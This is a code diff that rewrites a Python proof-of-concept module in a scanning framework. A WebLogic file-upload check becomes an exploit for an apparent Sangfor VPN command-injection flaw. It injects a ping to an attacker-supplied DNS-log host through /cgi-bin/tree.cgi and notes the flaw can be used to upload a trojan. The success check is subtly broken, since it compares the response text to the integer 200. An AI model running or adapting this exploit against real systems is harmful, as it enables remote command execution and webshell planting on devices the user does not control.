@@ -7,6 +7,7 @@ from colorama import init
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=False) 
 
+# 定义类 名称不可改变，且需要继承父类Pocs
 class POC(pocs.Pocs):
 
     def __init__(self):
@@ -15,16 +16,17 @@ class POC(pocs.Pocs):
         '''
         # 根据漏洞的信息进行定义
         super().__init__()
-        self.poc_name='weblgic 任意文件上传漏洞'
-        self.vul_name='weblgic 任意文件上传漏洞'
-        self.vul_num='CVE-2018—2894'
-        self.app_name='weblgic'
-        self.app_version='10.3.6 12.1.3 12.2.1'
+        self.poc_name='深信服vpn任意命令执行漏洞(dnslog验证)'
+        self.vul_name='深信服vpn任意命令执行漏洞（dnslog验证）'
+        self.vul_num=''
+        self.app_name='深信服vpn'
+        self.app_version=''
         self.author='haochen'
-        self.msg="在知道部署应用到web目录以及ws_utc/config.do存在的情况下可以利用"
+        self.msg='深信服vpn存在任意命令执行漏洞，可以利用脚本直接上传phpinfo或木马，当前验证脚本为上传phpinfo'
         # 根据需要的参数进行定义，被攻击的url或ip必须定义为target
         self.must_parameter={
-            'target' : ''
+            'target' : '',
+            'dns_log': ''
         }
 
     def exploit(self,must_parameter,cho_parameter):
@@ -38,21 +40,25 @@ class POC(pocs.Pocs):
         att_msg['target']=url
         att_msg['pocname'] = self.poc_name
         self.must_parameter = must_parameter
-        head = config.Pack
-        self.payload='/ws_utc/config.do'
+        head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'}
+        self.payload="""/cgi-bin/tree.cgi?a=ping """+self.must_parameter['dns_log']
         if re.search('/$',url):
             url=url[0:len(url)-1]
         target = url + self.payload
         try:
-            response = requests.get(target,headers=head)
+            response1 = requests.get(target,headers=head,verify=False)
+
             # 攻击完成后需要将攻击的结果写入
-            if response.status_code == 200:
+            if response1.text == 200:
                 att_msg['status'] = 'success'
-                att_msg['msg'] = '存在漏洞,请尝试进行攻击'
+                att_msg['msg'] = '可能存在漏洞，请进入dnslog查看 ' + self.must_parameter['dns_log']
             else:
                 att_msg['status']='failed'
-                att_msg['msg']='不存在漏洞，网站返回值为: '+str(response.status_code) 
+                att_msg['msg']='不存在漏洞，网站返回值为: ' + str(response1.status_code)
+                #self.set_cout('failed','不存在漏洞，网站返回值为: '+str(response.status_code) )
         except:
             att_msg['status']='error'
             att_msg['msg']='无法正确访问网站'
+            #self.set_cout('error','无法正确访问网站！')
+        # 返回攻击结果信息
         return att_msg
